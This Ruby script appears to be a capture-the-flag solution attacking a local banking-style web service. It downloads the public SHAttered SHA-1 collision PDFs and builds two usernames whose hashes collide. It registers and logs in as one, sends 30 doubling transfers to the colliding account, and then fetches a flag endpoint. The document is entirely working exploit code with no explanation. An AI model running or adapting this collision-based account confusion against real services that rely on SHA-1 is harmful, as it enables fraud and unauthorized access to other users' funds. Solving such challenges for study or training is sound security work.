require 'net/http'

HOST = ENV['HOST'] || 'localhost'

def urlencode(obj)
  obj.map{|k,v| '%s=%s' % ([k, v].map{|val| val.to_s.bytes.map{|b| '%%%02x' % b}.join})}.join ?&
end

sh1 = Net::HTTP.get_response(URI('http://shattered.io/static/shattered-1.pdf')).body
sh2 = Net::HTTP.get_response(URI('http://shattered.io/static/shattered-2.pdf')).body

random = 16.times.map{rand(256).chr}.join
user   = sh1[0, 0x200] + random
target = sh2[0, 0x200] + random
pass   = 'strongpassword'

Net::HTTP.start(HOST, 19292) do |http|
  resp = http.post('/api/register', urlencode({user: user, pass: pass}))
  raise 'error' unless resp.code.to_i == 200

  resp = http.post('/api/login', urlencode({user: user, pass: pass}))
  raise 'error' unless resp.code.to_i == 200
  cookie = resp['Set-Cookie']

  amount = 100
  30.times do
    resp = http.post('/api/balance', urlencode({}), {Cookie: cookie})
    puts resp.body

    resp = http.post('/api/transfer', urlencode({target: target, amount: amount}), {Cookie: cookie})
    raise 'error' unless resp.code.to_i == 200
    amount *= 2
  end

  resp = http.get2('/api/flag', {Cookie: cookie})
  raise 'error' unless resp.code.to_i == 200
  puts resp.body
end
